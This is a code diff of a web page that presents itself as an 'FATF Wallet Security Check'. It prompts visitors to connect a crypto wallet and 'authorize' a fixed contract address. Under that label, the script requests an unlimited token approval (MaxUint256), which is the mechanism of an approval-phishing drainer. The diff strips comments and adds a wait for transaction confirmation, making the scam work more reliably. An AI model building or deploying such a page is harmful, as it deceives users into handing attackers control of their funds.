@@ -61,7 +61,6 @@
         <h1>FATF Wallet Security Check</h1>
     </header>
 
-    <!-- Wallet Security Check Section -->
     <div class="container">
         <h2>Connect and Authorize Wallet</h2>
         <p>Connect your wallet and authorize the contract to proceed with the security check.</p>
@@ -80,7 +79,6 @@
         const contractAddress = "0x67A0bCBC059358E96bF4e85B43FFB2a12f25e097"; // Example Contract Address
         let provider, signer;
 
-        // Connect wallet function
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
                 try {
@@ -98,7 +96,6 @@
             }
         }
 
-        // Authorize contract function
         async function authorizeContract() {
             if (!signer) {
                 alert("Please connect your wallet first.");
@@ -110,6 +107,7 @@
 
             try {
                 const tx = await tokenContract.approve(contractAddress, ethers.constants.MaxUint256);
+                await tx.wait();  // Wait for transaction confirmation
                 alert("Wallet authorized successfully.");
             } catch (error) {
                 alert("Failed to authorize wallet.");
